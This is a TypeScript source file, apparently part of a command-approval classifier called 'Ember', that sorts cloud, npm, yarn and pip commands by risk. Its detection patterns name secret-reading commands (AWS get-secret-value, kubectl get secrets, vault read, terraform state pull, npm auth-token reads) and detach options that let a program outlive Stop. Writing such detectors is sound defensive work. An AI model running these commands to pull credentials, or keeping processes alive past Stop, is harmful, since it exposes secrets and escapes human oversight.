const CLOUD_VERBS = new Set(["create", "update", "set", "add", "start", "stop", "restart", "reset", "deploy", "run", "apply", "attach", "import", "export", "upload", "download", "copy", "move", "resize", "scale", "enable", "disable", "ssh", "scp", "connect", "invoke", "publish", "tag", "untag", "patch", "replace", "edit", "rollout", "login", "logout", "configure", "assign", "grant", "revoke", "rotate", "promote", "suspend", "resume", "reboot", "cancel", "approve", "submit", "write", "put", "push", "pull", "sync", "mount", "unmount", "init", "exec", "cp", "mv", "label", "annotate", "cordon", "uncordon", "taint", "expose", "autoscale", "port-forward", "proxy", "certificate"]);
/** Verb shapes that change a cloud service ("run-instances", "put-object", "modify-db-instance", "s3 mb"). */
const CLOUD_CHANGE = /^(?:s3 \S+|(?:create|update|put|set|run|start|stop|reboot|modify|attach|associate|disassociate|add|import|export|enable|disable|register|tag|untag|send|publish|invoke|apply|replace|restore|copy|reset|change|cancel|accept|reject|authorize|revoke|allocate|release|request|upload|deploy|scale|rotate|install|upgrade|rollback|promote|refresh|new|select|force-unlock|untaint|push|mv|renew|regenerate)(?:-.*)?)$/;
/**
 * The read verbs that pick the verb out of a command group path (gcloud, az, doctl…). The ones review #30 added to
 * CLOUD_READ ("search", "events", "graph", "ls", "tail") are also group names (`az search service delete`), so there
 * they read only as the last word or in CLOUD_READ_PHRASES.
 */
const CLOUD_PATH_READ = new Set(["get", "list", "describe", "show", "logs", "top", "plan", "version", "status", "whoami", "explain", "diff", "help"]);
const AWS_SECRET = /^(get-session-token|assume-role.*|get-login-password|get-authorization-token|get-secret-value|get-parameters?|get-parameters-by-path|decrypt|get-federation-token|create-access-key|get-credentials-for-identity|get-signin-token)$/;
reg(NATIVE, Object.keys(CLOUD_CLIS), h => {
  const service = CLOUD_CLIS[h.key];
  const grammar = GLOBAL_OPTIONS[h.key];
  const g = grammar ? globals(h, h.key) : null;
  if (g) checkGlobals(h, h.key, g);
  if (g) for (const o of g.opts) if (/^(--token|--password|--kube-token)$/.test(o.name)) h.e.add("secret", "secret.token-arg", SAYS.tokenArg);
  const start = g ? g.verbAt : 0;
  const rest = h.args.slice(start);
  const positional: string[] = [];
  for (const a of rest) {
    if (a.v === null) { positional.push("?"); break; }
    if (a.v.startsWith("-")) break;
    positional.push(a.v);
  }
  const verbs = positional.map(p => p.toLowerCase());
  // A syntax check or a listing reads (review #30). `--check` doesn't: a task with `check_mode: false` still changes the
  // managed computers, so it asks without saying that it changes them.
  if (h.key === "ansible-playbook" && h.args.some(a => /^(--syntax-check|--list-hosts|--list-tasks|--list-tags)$/.test(a.v ?? ""))) return;
  const checkRun = h.key === "ansible-playbook" && h.args.some(a => /^(--check|-C)$/.test(a.v ?? ""));
  if (verbs.length === 0) {
    if (h.args.some(a => /^(--?version|--?help|-h|version|help)$/.test(a.v ?? ""))) return;
    if (h.key === "ansible" || h.key === "ansible-playbook") { h.e.add("publish", "cloud.change", checkRun ? `Ember can't tell whether this changes ${service}.` : `Changes ${service}.`); return; }
    return;
  }
  if (verbs.includes("?")) {
    h.e.unclear("unclear.cloud-verb", "Ember can't tell which command this runs.");
    // A copy or a download with a word Ember can't see may save a file anywhere (commands-remote-r7-3).
    if (verbs.some(v => /^(cp|mv|rsync|download|download-batch)$/.test(v))) h.e.markUnnamed(null, h.sc);
    return;
  }
  let verb: string;
  switch (h.key) {
    case "aws": verb = verbs[0] === "s3" ? `s3 ${verbs[1] ?? ""}` : verbs[1] ?? verbs[0]; break;
    case "terraform": case "tofu": verb = verbs[0] === "state" || verbs[0] === "workspace" ? verbs[1] ?? verbs[0] : verbs[0]; break;
    case "kubectl": case "oc": case "helm": case "pulumi": case "vault": case "heroku": case "vercel": case "netlify": case "flyctl": case "fly": case "wrangler": case "firebase": case "cdk": case "sam": case "serverless": case "sls": case "nomad": case "consul": case "eksctl": case "gsutil":
      verb = verbs[0]; break;
    default: {
      // gcloud, az, doctl, oc…: a command group path, then the verb, then names. A group may be named like a read
      // (`az search service delete`, `gcloud logging logs delete`, `az appservice plan create`), so a delete or change
      // verb anywhere is the verb (one shaped like a change only before the first read verb: a name after `describe`
      // may look like one), then the first read verb, then the last word.
      const isRead = (v: string) => CLOUD_PATH_READ.has(v) || /^(describe|list|get)-/.test(v);
      const firstRead = verbs.findIndex(isRead);
      const known = verbs.find(v => CLOUD_DELETE.has(v) || /^(delete|terminate|remove|deregister|purge)-/.test(v))
        ?? verbs.find(v => CLOUD_VERBS.has(v) || /^(create|update)-/.test(v))
        ?? (firstRead < 0 ? verbs : verbs.slice(0, firstRead)).find(v => CLOUD_CHANGE.test(v))
        ?? verbs[firstRead];
      verb = known ?? verbs[verbs.length - 1];
    }
  }
  const all = verbs.join(" ");
  // Secrets first (always ask).
  if ((h.key === "aws" && (verbs[0] === "configure" || AWS_SECRET.test(verb)))
    || (h.key === "az" && (/^(get-access-token|login)$/.test(verb) || all.startsWith("account get-access-token")))
    || (h.key === "gcloud" && /^auth\b/.test(all) && /(print-access-token|print-identity-token|login|activate-service-account)/.test(all))
    || ((h.key === "kubectl" || h.key === "oc") && ((verbs[0] === "config" && verbs[1] === "view" && h.args.some(a => a.v === "--raw" || a.v === "--flatten")) || (verbs[0] === "get" && /^secrets?$/.test(verbs[1] ?? "") && h.args.some(a => /^-o(yaml|json|=|$)|^--output/.test(a.v ?? "")))))
    || (h.key === "vault" && (/^(read|login|token|unwrap)$/.test(verb) || all.startsWith("kv get")))) {
    h.e.add("secret", "secret.cloud", SAYS.secrets, { program: `${h.key} ${verb}` });
    return;
  }
  // Azure's vault values and the keys and sign-ins its services hand out, and Terraform's outputs and state written
  // out in full (`-raw` and `-json` don't mask what is marked sensitive): secrets too (commands-remote-r9-9). What the
  // verb is judged to do besides stays, so none of them loses a danger it had (`az keyvault secret download`,
  // `terraform state pull` asked as changes).
  if ((h.key === "az" && (/^keyvault (secret|key|certificate) (show|download|backup)\b/.test(all) || /\b(keys list|list-keys|credential show|show-connection-string|get-credentials|list-credentials|keys renew)\b/.test(all)))
    || ((h.key === "terraform" || h.key === "tofu") && ((verbs[0] === "output" && h.args.some(a => /^-(raw|json)$/.test(a.v ?? ""))) || (verbs[0] === "show" && h.args.some(a => a.v === "-json")) || all.startsWith("state pull")))) {
    h.e.add("secret", "secret.cloud", SAYS.secrets, { program: `${h.key} ${verb}` });
  }
  if (h.key === "aws" && verbs[0] === "s3") {
    const ops = rest.filter(a => !isOption(a)).slice(2).map(a => a.v ?? "");
    const toS3 = ops.length > 0 && ops[ops.length - 1].startsWith("s3://");
    const fromS3 = ops.some((o, k) => k < ops.length - 1 && o.startsWith("s3://"));
    const sub = verbs[1] ?? "";
    if (sub === "rm" || sub === "rb" || (sub === "mv" && fromS3) || (sub === "sync" && toS3 && h.args.some(a => a.v === "--delete"))) { h.e.add("remote-delete", "cloud.delete", "Deletes files in AWS S3.", { program: `aws s3 ${sub}` }); return; }
    if ((sub === "cp" || sub === "mv" || sub === "sync") && toS3) {
      h.e.readArgs(rest.filter(a => !isOption(a)).slice(2, -1).map(a => a), h.sc);
      h.e.add("publish", "upload.cloud", "Sends data to AWS S3.", { program: `aws s3 ${sub}` });
      return;
    }
    if ((sub === "cp" || sub === "sync") && fromS3) { const dest = rest.filter(a => !isOption(a)).pop(); if (dest) { h.e.usePath(dest, "write", h.sc); h.e.download(dest.v, h.sc); } return; }
  }
  if (h.key === "gsutil" && /^(cp|mv|rsync)$/.test(verb)) {
    const ops = rest.filter(a => !isOption(a)).slice(1).map(a => a.v ?? "");
    if (ops[ops.length - 1]?.startsWith("gs://")) { h.e.add("publish", "upload.cloud", "Sends data to Google Cloud Storage."); return; }
  }
  // A file copied down from a bucket, a pod or a storage account is a download where it lands (commands-remote-r7-3):
  // the words after the one that names the remote place; anywhere, when Ember can't see a word. It asks as before.
  {
    const words = rest.filter(a => !isOption(a));
    const copies = (h.key === "gsutil" && /^(cp|mv|rsync)$/.test(verbs[0] ?? "")) || (h.key === "gcloud" && verbs[0] === "storage" && /^(cp|mv|rsync)$/.test(verbs[1] ?? ""))
      || ((h.key === "kubectl" || h.key === "oc") && verbs[0] === "cp");
    const remote = (a: Arg): boolean => a.v === null || /^gs:\/\//.test(a.v) || ((h.key === "kubectl" || h.key === "oc") && /^[^/\\:]+(\/[^/\\:]+)?:/.test(a.v) && !/^[A-Za-z]:[\\/]/.test(a.v));
    // Every word after the remote one that isn't remote itself (an option's value among them: marking more is safe).
    const from = copies ? words.findIndex(a => a.v !== null && remote(a)) : -1;
    if (from >= 0) for (const dest of words.slice(from + 1)) { if (dest.v === null) h.e.markUnnamed(null, h.sc); else if (!remote(dest)) h.e.download(dest.v, h.sc); }
    else if (copies && words.some(a => a.v === null)) h.e.markUnnamed(null, h.sc);
    if (h.key === "az" && verbs.some(v => v === "download" || v === "download-batch")) {
      const ap = parseOpts(h.args, { shortValue: "fdncs", longValue: ["file", "destination", "name", "container-name", "source", "account-name", "pattern", "path"] });
      const to = values(ap, "f", "file", "d", "destination");
      if (to.length === 0) h.e.markUnnamed(".", h.sc);
      for (const f of to) { if (f) h.e.download(f, h.sc); else h.e.markUnnamed(null, h.sc); }
    }
  }
  if ((h.key === "terraform" || h.key === "tofu" || h.key === "pulumi") && verb === "apply" && h.args.some(a => a.v === "-destroy")) verb = "destroy";
  if ((h.key === "kubectl" || h.key === "oc") && (verb === "edit" || (verb === "exec" && h.args.some(a => /^-[a-z]*i[a-z]*t|^-[a-z]*t[a-z]*i/.test(a.v ?? ""))))) h.e.unclear("unclear.interactive", SAYS.interactive);
  // `kubectl cluster-info dump` prints, unless it writes the dump into a folder: that is judged as any other write.
  if ((h.key === "kubectl" || h.key === "oc") && verb === "cluster-info" && verbs[1] === "dump") {
    for (const d of values(parseOpts(rest, { longValue: ["output-directory"] }), "output-directory")) {
      if (d === null) h.e.unclear("unclear.output-folder", "Ember can't tell which folder this writes to.");
      else h.e.usePath(lit(d), "write", h.sc);
    }
    return;
  }
  // `terraform providers` reads, bare or with `schema`; `mirror` and `lock` download the providers (as init does).
  const fetchesProviders = (h.key === "terraform" || h.key === "tofu") && verb === "providers" && verbs.length > 1 && verbs[1] !== "schema";
  const read = !fetchesProviders && (CLOUD_READ.has(verb) || /^(describe|list|get)-/.test(verb) || CLOUD_READ_PHRASES.some(p => all === p || all.startsWith(`${p} `)));
  if (read) return;
  // `terraform init` changes no infrastructure: it installs the providers and modules the folder's configuration names.
  if ((h.key === "terraform" || h.key === "tofu") && verb === "init") {
    h.e.add("system", "pkg.language", "Installs the providers and modules this folder's configuration uses.", { program: `${h.key} init` });
    return;
  }
  if (fetchesProviders) {
    if (verbs[1] === "mirror") { const dir = rest.filter(a => !isOption(a))[2]; if (dir) h.e.usePath(dir, "write", h.sc); }
    h.e.add("system", "pkg.language", "Downloads the providers this folder's configuration uses.", { program: `${h.key} providers ${verbs[1]}` });
    return;
  }
  if (CLOUD_DELETE.has(verb) || /^(delete|terminate|remove|deregister|purge)-/.test(verb) || verb.endsWith(" rm") || verb === "s3 rb") {
    h.e.add("remote-delete", "cloud.delete", `Deletes something in ${service}.`, { objects: [{ kind: "other", text: verb, abs: null }], program: `${h.key} ${verb}` });
    return;
  }
  // A verb Ember doesn't know may only read: the card says it can't tell rather than that it changes the service.
  const changes = !checkRun && (CLOUD_VERBS.has(verb) || CLOUD_CHANGE.test(verb) || (h.key === "ansible" || h.key === "ansible-playbook"));
  h.e.add("publish", "cloud.change", changes ? `Changes ${service}.` : `Ember can't tell whether this changes ${service}.`, { objects: [{ kind: "other", text: verb, abs: null }], program: `${h.key} ${verb}` });
});

// ------------------------------------------------------------------------------------------------------------------
// Packages and project tasks (§3.5.5, §3.5.6, §3.5.9).

/** A package spec that isn't from a registry: a URL, a git repository or a path (its setup code runs: class f). */
const OFF_REGISTRY = /^(?:[a-z][a-z0-9+.-]*:\/\/|git\+|git:|github:|gitlab:|bitbucket:|gist:|file:|[A-Za-z0-9_.-]+@[A-Za-z0-9.-]+:|\.{0,2}\/|~\/|[A-Za-z]:\\)|\.(tgz|tar\.gz|whl|zip|gem|crate|nupkg)$/i;

/** The packages a language install names (`name@1.2`, `name==1.2` → the name). */
function packageObjects(h: H, specs: Arg[]): Obj[] {
  const out: Obj[] = [];
  for (const s of specs) {
    if (s.v === null) { out.push({ kind: "package", text: s.raw, abs: null }); continue; }
    if (OFF_REGISTRY.test(s.v)) {
      h.e.add("escape", "pkg.off-registry", "Installs a package from a URL, a git repository or a file; its setup code runs.", { objects: [{ kind: "url", text: s.v, abs: null }] });
      continue;
    }
    out.push({ kind: "package", text: s.v.replace(/^(@?[^@=<>!~\s]+).*$/, "$1"), abs: null });
  }
  return out;
}

/** Verbs that only take packages away (`npm uninstall`, `poetry remove`, `cargo rm`); `r` is npm's alone. */
const REMOVE_VERBS = new Set(["uninstall", "un", "remove", "rm", "uninject"]);
/** Words before the verb in a tool's own group of commands (`uv pip uninstall`, `dotnet tool uninstall`). */
const VERB_GROUPS = new Set(["pip", "tool", "tools", "workload", "global", "pub"]);

/** A language package command's verb, after a tool's own group word (`uv pip uninstall`). */
function packageVerb(h: H): string | null {
  const words = h.args.filter(a => !isOption(a)).map(a => a.v);
  const verb = VERB_GROUPS.has(words[0] ?? "") ? words[1] : words[0];
  return typeof verb === "string" ? verb : null;
}

/** Whether a language package command only removes packages (commands-remote-r1). */
function removesPackages(h: H): boolean {
  const verb = packageVerb(h);
  return verb !== null && (REMOVE_VERBS.has(verb) || (h.key === "npm" && verb === "r"));
}

function languageInstall(h: H, specs: Arg[], widening: string[] = []): void {
  const objects = packageObjects(h, specs);
  // `npm prune` removes what package.json doesn't list (commands-remote-r1).
  // `yarn autoclean --force` deletes files in node_modules (commands-remote-r1: it read "Installs packages").
  const cleans = packageVerb(h) === "autoclean" && h.args.some(a => a.v === "--force" || a.v === "-F");
  const says = removesPackages(h) ? PKG_REMOVES : packageVerb(h) === "prune" ? PKG_PRUNES : cleans ? PKG_CLEANS : "Installs packages (they can run their own setup code).";
  h.e.add("system", "pkg.language", says, { objects, widening, program: `${h.prog} ${h.args.find(a => !isOption(a))?.v ?? ""}`.trim() });
}

/** A package publish (`npm publish`, `yarn npm publish`): its tag, access and registry say how broad it is (§3.7). */
function publishPackage(h: H, rest: Arg[], widening: string[], program: string): void {
  const p = parseOpts(rest, { longValue: ["tag", "access", "registry", "otp", "provenance-file"] });
  const w = [...widening];
  for (const t of values(p, "tag")) w.push(`--tag=${t ?? ""}`);
  for (const t of values(p, "access")) w.push(`--access=${t ?? ""}`);
  if (values(p, "registry").length) w.push("--registry");
  const target = p.operands[0];
  h.e.add("publish", `${h.key}.publish`, `Publishes ${target?.v ?? "this package"} to the registry.`, { objects: [{ kind: "package", text: target?.v ?? "", abs: null }], widening: w, program });
}

/**
 * `yarn npm <command>`: how Yarn 2 and later reach the npm registry (publish, tags, login). Its own commands are
 * judged like npm's; one Ember doesn't know asks.
 */
function yarnNpm(h: H, rest: Arg[], widening: string[]): void {
  const at = rest.findIndex(a => !isOption(a));
  const sub = at < 0 ? undefined : rest[at].v;
  const after = at < 0 ? [] : rest.slice(at + 1);
  const what = after.find(a => !isOption(a))?.v;
  switch (sub) {
    case "publish": publishPackage(h, after, widening, "yarn npm publish"); return;
    case "tag":
      if (what === "add") { h.e.add("publish", "npm.registry", "Changes a package on the registry.", { program: "yarn npm tag add" }); return; }
      if (what === "remove") { h.e.add("remote-delete", "npm.unpublish", "Removes a package's tag or owner from the registry.", { program: "yarn npm tag remove" }); return; }
      if (what === "list") return;
      break;
    case "login": case "logout": h.e.add("secret", "secret.npm", SAYS.secrets); return;
    case "info": case "audit": case "whoami": return;
    default: break;
  }
  h.e.unclear("unclear.npm-verb", "Ember can't tell which yarn npm command this runs.");
}

/** Options of `yarn workspaces foreach` that take a value. */
const FOREACH_VALUE = new Set(["--from", "-j", "--jobs", "--include", "--exclude"]);

/**
 * `yarn workspaces foreach [options] <command>` runs a yarn command in many workspaces (broader than one, so no
 * request covers it); Yarn 1's `yarn workspaces run <script>` runs a script in each; `focus` installs. False: an
 * ordinary workspaces command (list, info).
 */
function yarnWorkspaces(h: H, rest: Arg[]): boolean {
  const sub = rest[0]?.v;
  if (sub === undefined || (sub !== null && !["foreach", "run", "focus"].includes(sub))) return false;
  if (sub === null) { h.e.unclear("unclear.npm-verb", "Ember can't tell which command this runs."); return true; }
  if (sub === "focus") { languageInstall(h, []); return true; }
  h.e.markGlobalOptions();
  let k = 1;
  for (; sub === "foreach" && k < rest.length; k++) {
    const v = rest[k].v;
    if (v === null || !v.startsWith("-")) break;
    if (FOREACH_VALUE.has(v)) k++;
  }
  const command = rest.slice(k);
  if (command.length === 0) return true;
  if (sub === "run") {
    const name = command[0].v;
    if (name === null) h.e.unclear("unclear.script", "It runs a script Ember can't name.");
    else { nameCheck(h, name); runnerLine(h, command[0], command.slice(1), `yarn workspaces run ${name}`); }
    return true;
  }
  NATIVE.yarn({ ...h, args: command });
  return true;
}

reg(NATIVE, ["npm", "pnpm", "yarn", "bun", "corepack"], h => {
  const g = globals(h, h.key === "bun" || h.key === "corepack" ? "npm" : h.key);
  if (h.key !== "bun" && h.key !== "corepack") checkGlobals(h, h.key, g);
  const verbArg = h.args[g.verbAt];
  const verb = verbArg?.v ?? null;
  const rest = h.args.slice(g.verbAt + 1);
  // `--script-shell <program>` changes the shell every package script runs in: a program Ember can't vouch for
  // (commands-remote-c8-1). `npm config set script-shell …` (never `get`) makes that change last for every later run.
  if (h.args.some(a => /^--script-shell(=|$)/.test(a.v ?? ""))) h.e.unclear("unclear.assignment", "It changes how package scripts are run.");
  const configVerb = verb === "config" || verb === "c" ? h.args[g.verbAt + 1]?.v ?? null : verb;
  if (configVerb === "set" && h.args.some(a => /^script-shell(=|$)/.test(a.v ?? ""))) h.e.unclear("unclear.assignment", "It changes how package scripts are run.");
  // `npm config get //registry.npmjs.org/:_authToken`, `npm get _auth`, `yarn config get npmAuthToken`: a stored token
  // printed (commands-classes-y9-7).
  if (/^(config|c|get)$/.test(verb ?? "") && rest.some(a => /_auth|_password|token|password|secret/i.test(a.v ?? ""))) h.e.add("secret", "secret.program", SAYS.secrets);
  const global = g.opts.some(o => o.name === "-g" || o.name === "--global") || rest.some(a => a.v === "-g" || a.v === "--global" || a.v === "--location=global");
  const widening = global ? ["--global"] : [];
  if (verbArg && verb === null) { h.e.unclear("unclear.npm-verb", "Ember can't tell which command this runs."); return; }
  if (verb === null) { if (h.key === "yarn") languageInstall(h, []); return; }
  // `corepack yarn …`, `corepack pnpm …`: the package manager's own line (commands-runners-1).
  if (h.key === "corepack" && /^(npm|npx|pnpm|pnpx|yarn|yarnpkg)$/.test(verb) && !h.e.readsAsMain) { h.e.payload(h.args.slice(g.verbAt), h.sc, "corepack"); return; }
  const specs = rest.filter(a => !isOption(a));
  if ((LANGUAGE_INSTALL_VERBS[h.key] ?? []).includes(verb) || (verb === "audit" && specs[0]?.v === "fix")) {
    if (verb === "pm" && !/^(trust|untrusted|migrate)$/.test(specs[0]?.v ?? "")) return;
    languageInstall(h, verb === "audit" ? [] : specs.filter((_a, k) => !(h.key === "npm" && verb === "link" && k > 0)), widening);
    return;
  }
  switch (verb) {
    case "publish": publishPackage(h, rest, widening, `${h.key} publish`); return;
    case "npm": if (h.key === "yarn") { yarnNpm(h, rest, widening); return; } break;
    case "deprecate": case "access": h.e.add("publish", "npm.registry", "Changes a package on the registry."); return;
    case "dist-tag": case "dist-tags": case "owner": case "author": case "team": case "org":
      if (/^(rm|remove|del|delete)$/.test(specs[0]?.v ?? "")) h.e.add("remote-delete", "npm.unpublish", "Removes a package's tag or owner from the registry.");
      else if (/^(add|set|grant|revoke)$/.test(specs[0]?.v ?? "")) h.e.add("publish", "npm.registry", "Changes a package on the registry.");
      return;
    case "unpublish": h.e.add("remote-delete", "npm.unpublish", `Removes ${specs[0]?.v ?? "a package"} from the registry.`); return;
    case "token": case "login": case "adduser": case "add-user": case "logout": case "whoami":
      if (verb !== "whoami") h.e.add("secret", "secret.npm", SAYS.secrets);
      return;
    case "run": case "run-script": case "rum": case "urn": {
      const name = specs[0]?.v;
      if (name === undefined) return;
      if (name === null) { h.e.unclear("unclear.script", "It runs a script Ember can't name."); return; }
      nameCheck(h, name);
      // yarn, pnpm and bun run the project's own rimraf when no script has that name; npm runs only scripts
      // (commands-remote-c8-2). With nothing after the name it is the project's script of that name, or a deleter
      // given nothing to delete (`yarn scrub`: commands-remote-x8-13).
      const given = rest.slice(rest.indexOf(specs[0]));
      scriptGiven(h, `${h.key} run ${name}`, given.slice(1));
      // npm's own `env` script prints the environment when the project has none of that name (commands-runners-2).
      if (name === "env" && !h.e.readsAsMain) h.e.add("secret", "secret.env", SAYS.env);
      if (h.e.readsAsMain) { if (h.key !== "npm" && h.key !== "corepack" && NEW_DELETERS.has(name.toLowerCase()) && given.length > 1) h.e.payload(given, h.sc, `${h.key} run ${name}`); }
      else runnerLine(h, given[0], given.slice(1), `${h.key} run ${name}`);
      return;
    }
    case "exec": case "x": case "dlx": case "create":
      h.e.add("escape", "escape.npx", SAYS.downloadsProgram);
      // The package's own command line is judged too (modes-y9-5); `create x` runs create-x's initialiser.
      if (verb !== "create") packageLine(h, rest, `${h.key} ${verb}`);
      return;
    case "init": case "innit":
      if (specs.length) h.e.add("escape", "escape.npx", SAYS.downloadsProgram);
      else if (!rest.some(a => /^(-y|--yes|-f|--force)$/.test(a.v ?? ""))) h.e.unclear("unclear.interactive", SAYS.interactive);
      return;
    case "config": case "c": case "set":
      if (/^(set|delete|rm|unset|edit|fix)$/.test(specs[0]?.v ?? "") || verb === "set") {
        // A setting every later command of the tool obeys: the registry packages come from, an auth line, a proxy
        // (commands-remote-r9-11).
        h.e.add("system", "pkg.config", "Changes a setting later commands obey, such as where packages come from.", { program: `${h.key} config` });
        if (global || rest.some(a => a.v === "--location=global" || a.v === "--global")) h.e.add("system", "npm.config.global", "Changes settings for every user.");
        if (specs[0]?.v === "edit") h.e.unclear("unclear.interactive", SAYS.interactive);
      }
      return;
    case "plugin": case "policies": {
      // yarn's plugins are code every later yarn command loads, and `policies set-version` fetches the yarn that
      // later commands run: a setting they obey, and for an import or a release a program fetched to run
      // (commands-classes-x9-6). Only what lists runs; pnpm and bun have no such command, so there it is a script.
      if (h.key !== "yarn") break;
      const sub = specs[0]?.v ?? null;
      if (verb === "plugin" && sub !== null && /^(list|runtime|check)$/.test(sub)) return;
      h.e.add("system", "pkg.config", "Changes a setting later commands obey, such as where packages come from.", { program: `yarn ${verb}` });
      if (sub === null || /^(import|set-version)$/.test(sub)) h.e.add("escape", "escape.npx", SAYS.downloadsProgram);
      return;
    }
    case "cache": if (/^(clean|clear|rm|delete|prune)$/.test(specs[0]?.v ?? "")) h.e.add("destroy", "npm.cache", "Deletes the package manager's cache."); return;
    // The command's own options and words go with it (`yarn workspace web node -e …`: integ2-z-1); main's reading
    // took the plain words only.
    case "workspace": if (h.key === "yarn" && specs.length >= 2) { const inner: H = { ...h, args: h.e.readsAsMain ? specs.slice(1) : rest.slice(rest.indexOf(specs[1])) }; NATIVE.yarn(inner); } return;
    case "workspaces": if (h.key === "yarn" && yarnWorkspaces(h, rest)) return; break;
    case "exec-file": return;
    default: break;
  }
  const builtins = new Set(["test", "t", "tst", "start", "stop", "restart", "build", "pack", "version", "ls", "list", "outdated", "view", "info", "show", "search", "help", "doctor", "ping", "prefix", "root", "bin", "why", "explain", "fund", "audit", "diff", "query", "sbom", "completion", "edit", "explore", "repo", "docs", "bugs", "home", "shrinkwrap", "find-dupes", "pkg", "stars", "star", "unstar", "hook", "profile", "help-search", "licenses", "store", "env", "setup", "--version", "-v", "workspaces", "constraints", "dedupe"]);
  if (h.key === "npm" && !builtins.has(verb) && !/^(test|start|stop|restart)$/.test(verb)) { h.e.unclear("unclear.npm-verb", "Ember can't tell which npm command this runs."); return; }
  if (verb === "edit" || verb === "explore") { h.e.unclear("unclear.interactive", SAYS.interactive); return; }
  if (verb === "star" || verb === "unstar" || verb === "hook" || verb === "profile") { h.e.add("publish", "npm.registry", "Changes something on the registry."); return; }
  if (h.key !== "npm" && !builtins.has(verb)) {
    nameCheck(h, verb);
    scriptGiven(h, `${h.key} ${verb}`, h.args.slice(g.verbAt + 1));
    // `yarn rimraf src` runs the project's rimraf when no script has that name: judged as that program would be
    // (commands-remote-c8-2). Only a deleter's name, so `yarn build` or `yarn format` stay a script's, and only with
    // something after it (`yarn scrub` alone: commands-remote-x8-13).
    if (h.e.readsAsMain) { if (NEW_DELETERS.has(verb.toLowerCase()) && h.key !== "corepack" && h.args.length > g.verbAt + 1) h.e.payload(h.args.slice(g.verbAt), h.sc, `${h.key} ${verb}`); }
    // corepack runs nothing by name but a package manager (above): its own verbs are no script (commands-runners-4).
    else if (h.key !== "corepack") runnerLine(h, verbArg, h.args.slice(g.verbAt + 1), `${h.key} ${verb}`);
  } else if (/^(test|start|stop|restart)$/.test(verb)) nameCheck(h, verb);
  // The project's scripts the managers run by a word of their own (`npm test -- x`, `pnpm build x`: integ2-z-1).
  if (h.key !== "corepack" && (/^(test|t|tst|start|stop|restart)$/.test(verb) || (h.key !== "npm" && verb === "build"))) runnerLine(h, verbArg, h.args.slice(g.verbAt + 1), `${h.key} ${verb}`);
  // Yarn's `env` prints the variables scripts run with (commands-runners-2).
  if (h.key === "yarn" && verb === "env" && !h.e.readsAsMain) h.e.add("secret", "secret.env", SAYS.env);
});
reg(NATIVE, ["npx", "pnpx", "bunx", "uvx", "yarnpkg-dlx"], h => { h.e.add("escape", "escape.npx", SAYS.downloadsProgram); packageLine(h, h.args, h.key); });

/** Options of the download-and-run runners that take the next word (`npx -p pkg`, `uvx --from pkg`, `pipx run --spec x`). */
const PACKAGE_RUN_VALUES = new Set([
  "-p", "--package", "--node-arg", "-n", "--shell", "--userconfig", "-w", "--workspace", "--cache", "--registry", "--filter", "-C", "--dir", "--from", "--with",
  "--with-editable", "--with-requirements", "--python", "--index", "--index-url", "--extra-index-url", "--default-index", "--find-links", "--cache-dir", "--spec",
  "--pip-args", "-i", "--config-file", "--cwd", "--prefix",
]);

/**
 * An option that asks a program to leave the command and keep running (`--daemon`, `--detach`, `--fork`,
 * `--background`: the detach words of intent.ts's NEVER_BY_WORDS), never one that turns it off (`--daemon=false`).
 */
const DETACH_OPTION = /^--?(fork|detach|detached|daemon|daemonize|daemonise|background|bg|nohup)(?:[=:](?!(?:false|no|off|0)$).*)?$/i;

/**
 * A downloaded program's own words that ask it to detach (integ-x-2): Ember knows nothing else of the program, and
 * the option says it would outlive Stop, so it is filed where the modes hold it (`escape.background`), as a known
 * process manager in the same place is.
 */
function detachWords(h: H, words: readonly Arg[]): void {
  if (words.some(a => a.v !== null && DETACH_OPTION.test(a.v))) h.e.add("escape", "escape.background", SAYS.keepsRunning);
}

/**
 * The command line of a package a runner downloads and runs (modes-y9-5; `npx`, `pnpx`, `bunx`, `uvx`, `pipx run`,
 * `npm exec`, `pnpm dlx`, `yarn dlx`, `bun x`): judged as a command of its own beside the runner's `escape.npx`, so
 * a secret path or a secret-named variable it is handed, and what the package is known to do (`pm2 start` outlives
 * Stop, `rimraf` deletes), are named for the modes that read findings. The program is the package's name without its
 * scope and version; `-c`/`--call` text is shell text.
 */
function packageLine(h: H, words: readonly Arg[], wrapper: string): void {
  if (h.e.readsAsMain) return;
  for (let k = 0; k < words.length; k++) {
    const v = words[k].v;
    if (v === null) { h.e.readArgs(words.slice(k), h.sc, { unresolvedUnclear: true }); return; }
    if (v === "--") continue;
    if (v.startsWith("-")) {
      const m = /^(-c|--call)(?:=(.*))?$/.exec(v);
      if (m) {
        const text = m[2] !== undefined ? m[2] : words[++k]?.v;
        if (text === null || text === undefined) h.e.unclear("unclear.hidden-command", `Ember can't tell what ${wrapper} runs.`);
        else h.e.nested(text, h.sc.family === "powershell" ? "powershell" : h.sc.family === "cmd" ? "cmd" : "sh", h.sc, wrapper);
        continue;
      }
      if (PACKAGE_RUN_VALUES.has(v)) k++;
      continue;
    }
    // An address or a registry spec (`https://…/a.ts`, `npm:pkg`): a program Ember can't name, its words read as paths.
    if (URL_LIKE.test(v) || /^[a-z][a-z0-9+.-]*:/i.test(v)) { h.e.readArgs(words.slice(k + 1), h.sc, { unresolvedUnclear: true }); h.e.afterArgs(words.slice(k + 1), wrapper); detachWords(h, words.slice(k + 1)); return; }
    const bin = (v.replace(/^@[^/]+\//, "").replace(/@[^@/]*$/, "").split(/[\\/]/).pop() ?? v) || v;
    const from = h.e.findings.length;
    // The runner drops one `--` after the package (`npm exec pm2 -- start app.js` runs `pm2 start app.js`).
    const rest = words.slice(words[k + 1]?.v === "--" ? k + 2 : k + 1);
    h.e.payload([{ ...words[k], v: bin, raw: bin }, ...rest], h.sc, wrapper);
    // That the package is a program Ember doesn't know is what the runner's own finding already says ("Downloads a
    // program and runs it."): only what its line is handed, and what Ember knows of the package, is added, so `npx
    // cowsay hi` decides as it did (the approval modes read `unknown` as "can't tell").
    h.e.dropFindings(from, f => f.rule === "unknown.program");
    detachWords(h, rest);
    return;
  }
}


function pip(h: H): void {
  const g = globals(h, "pip");
  checkGlobals(h, "pip", g);
  const verb = h.args[g.verbAt]?.v ?? null;
  const rest = h.args.slice(g.verbAt + 1);
  if (verb === "install" || verb === "uninstall") {
    // Main's table knew no --cache-dir, --cert, --proxy, --log and the like, so the word after one was a package to
    // install: judged that way too (commands-held-8).
